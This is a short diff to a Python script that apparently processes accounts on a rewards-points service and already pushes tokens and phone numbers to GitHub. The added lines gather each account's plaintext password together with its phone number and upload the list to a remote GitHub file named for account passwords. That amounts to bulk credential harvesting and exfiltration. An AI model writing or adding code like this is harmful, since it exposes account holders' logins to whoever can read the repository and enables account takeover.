@@ -365,13 +365,16 @@ def msg_send():
     for item in sorted_data:
         phone = item['mobile']
         availablePoint = item['availablePoint']
+        password = item['password']
         msg.append(f"{phone}：{availablePoint}吉分")
+        git_userpssd.append(phone + '----' + password)
         git_token.append(item['token'])
         git_phone.append(item['mobile'])
     send(f"{title_name}：{len(sorted_data)}", '\n'.join(msg))
     update_github_file(f"token/{title_name}/jlqc.json", info_filtered)
     update_github_file(f"token/{title_name}/phone_list.txt", '\n'.join(git_phone))
     update_github_file(f"token/{title_name}/token_list.txt", '\n'.join(git_token))
+    update_github_file(f"token/{title_name}/账号密码.txt", '\n'.join(git_userpssd))
     if len(msg_error + msg_back) > 0:
         send(f"{title_name}异常", '\n'.join(msg_error + msg_back))
     
@@ -383,6 +386,7 @@ if __name__ == '__main__':
     msg_back = []
     git_token = []
     git_phone = []
+    git_userpssd = []
     index = 0
     with open(filepath, 'r') as f:
         info_new = json.load(f)
